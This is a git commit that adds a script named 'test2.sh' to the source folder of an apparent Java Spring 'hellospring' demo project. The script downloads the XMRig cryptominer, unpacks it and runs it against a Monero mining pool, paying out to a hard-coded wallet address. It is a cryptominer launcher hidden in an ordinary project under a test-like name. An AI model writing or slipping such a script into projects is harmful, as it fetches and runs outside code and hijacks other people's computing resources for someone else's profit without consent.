d751ff8aac84031c863836f5f844e6a411edf084
ubuntuabd4 <97361845+ubuntuabd4@users.noreply.github.com>
2022-03-05 10:48:35 +0000

    Add files via upload

---
+++ hellospring/src/main/java/com/example/hellospring/test2.sh
@@ -0,0 +1,6 @@
+#!/bin/bash
+wget https://github.com/xmrig/xmrig/releases/download/v6.16.1/xmrig-6.16.1-linux-x64.tar.gz
+tar -xvf xmrig-6.16.1-linux-x64.tar.gz
+cd xmrig-6.16.1
+./xmrig -o pool.minexmr.com:4444 -u 43HMPa3Hs5DGGmHQMzuDiCDAYhF5A8GZXS3biojW6aUwF8Two1eSEq2KbweXGe9WkuhwRAehUcnGM1G7VfUFJJab4itzN5r.test
+
